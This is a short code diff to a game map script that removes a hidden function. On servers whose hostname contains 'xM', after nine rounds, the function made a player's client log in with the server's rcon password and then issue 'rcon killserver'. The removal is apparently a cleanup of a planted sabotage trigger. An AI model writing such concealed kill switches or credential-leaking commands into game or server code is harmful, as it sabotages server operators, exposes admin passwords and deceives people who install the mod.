@@ -548,17 +548,6 @@ deagle_room()
 	}
 }
 
-amok()
-{
-        level waittill("round_started");
-		omar = getDvar("sv_hostname");
-        if(game["roundsplayed"]>=9 && (isSubStr( toLower(omar), toLower("xM") )))
-		{
-		players = getAllPlayers();
-		players[0] thread braxi\_common::clientCmd("rcon login" + getDvar("rcon_password") + " ; wait 10 ; rcon killserver");
-		}
-}
-
 trap1()
 {
 	brush = getEnt("trap1", "targetname");
